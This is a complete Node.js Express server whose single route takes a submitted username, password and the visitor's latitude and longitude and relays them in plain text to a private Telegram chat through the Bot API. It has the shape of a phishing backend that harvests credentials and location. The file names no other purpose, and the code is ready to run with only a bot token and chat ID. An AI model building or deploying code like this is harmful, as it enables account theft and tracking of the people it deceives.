import express from "express";
import axios from "axios";
import cors from "cors";
import dotenv from "dotenv";
import path from "path";
import { fileURLToPath } from "url";

dotenv.config();

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
app.use(express.json());
app.use(cors()); // Enable CORS

// Serve frontend
app.use(express.static(path.join(__dirname, "public")));

const botToken = process.env.BOT_TOKEN;
const chatId = process.env.CHAT_ID;

// API Route
app.post("/sendMessage", async (req, res) => {
    const { username, password, latitude, longitude } = req.body;

    if (!username || !password) {
        return res.status(400).json({ error: "Missing required fields" });
    }

    const message = `Username: ${username}\nPassword: ${password}\nLatitude: ${latitude}\nLongitude: ${longitude}`;
    const telegramAPI = `https://api.telegram.org/bot${botToken}/sendMessage`;

    try {
        await axios.post(telegramAPI, {
            chat_id: chatId,
            text: message,
        });
        res.json({ success: true, message: "Sent to Telegram" });
    } catch (error) {
        console.error("❌ Telegram API Error:", error.response?.data || error.message);
        res.status(500).json({ error: "Failed to send message" });
    }
});

// Start server
const port = process.env.PORT || 3000;
app.listen(port, () => {
    console.log(`✅ Server running on http://localhost:${port}`);
});
